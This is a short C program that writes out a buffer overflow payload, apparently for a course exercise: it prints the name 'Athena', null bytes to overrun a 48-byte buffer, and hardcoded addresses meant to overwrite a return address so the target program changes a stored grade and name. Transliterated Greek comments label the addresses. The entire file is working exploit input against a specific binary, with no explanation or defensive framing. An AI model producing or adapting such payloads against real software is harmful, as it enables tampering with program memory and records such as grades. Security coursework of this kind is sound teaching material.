#include <stdio.h>

int main(){
int i;
putchar('A');
putchar('t');
putchar('h');
putchar('e');
putchar('n');
putchar('a');
putchar('\0'); /*7 chars*/

for(i=0; i<41; i++){/*overrun buffer(48 chars)*/
putchar('\0');
}

putchar(56); /*return address of $eax */
/*gia grade, dieythinsi apo return address(movb)*/
putchar(0x68);
putchar(0x8b);
putchar(0x04);
putchar(0x08);
/*gia name, dieythinsi apo bss section*/
 putchar(0xe0);
 putchar(0x65);
 putchar(0x0d);
 putchar(0x08);

putchar('\n');
return 0;
}
